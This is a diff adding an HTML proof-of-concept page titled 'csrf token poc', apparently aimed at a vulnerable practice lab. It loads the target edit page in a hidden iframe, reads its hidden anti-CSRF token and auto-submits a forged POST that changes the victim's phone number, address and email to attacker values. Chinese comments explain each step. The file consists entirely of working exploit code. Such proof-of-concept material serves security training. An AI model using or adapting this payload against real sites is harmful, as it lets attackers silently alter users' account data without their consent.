@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf‑8">
+<title>csrf token poc</title>
+</head>
+<body>
+<iframe id="frame" style="display:none;" src="https://27aedf8e3e0b4557b080c5a54e4a7f5c--8081.ap‑shanghai2.cloudstudio.club/vul/csrf/csrftoken/token_get_edit.php"></iframe>
+
+<script>
+var ifr = document.getElementById("frame");
+ifr.onload = function(){
+    // 同源下读取iframe页面中的token隐藏input
+    var doc = ifr.contentDocument || ifr.contentWindow.document;
+    var tokenVal = doc.querySelector('input[name="token"]').value;
+
+    // 构造POST提交修改用户信息
+    var form = document.createElement("form");
+    form.method = "POST";
+    form.action = "https://27aedf8e3e0b4557b080c5a54e4a7f5c--8081.ap‑shanghai2.cloudstudio.club/vul/csrf/csrftoken/token_get_edit.php";
+
+    // 表单参数
+    form.innerHTML = `
+    <input name="sex" value="girl">
+    <input name="phonenum" value="13800000000">
+    <input name="add" value="hacked">
+    <input name="email" value="hack@test.com">
+    <input name="token" value="${tokenVal}">
+    <input name="submit" value="submit">
+    `;
+    document.body.appendChild(form);
+    form.submit();
+}
+</script>
+</body>
+</html>
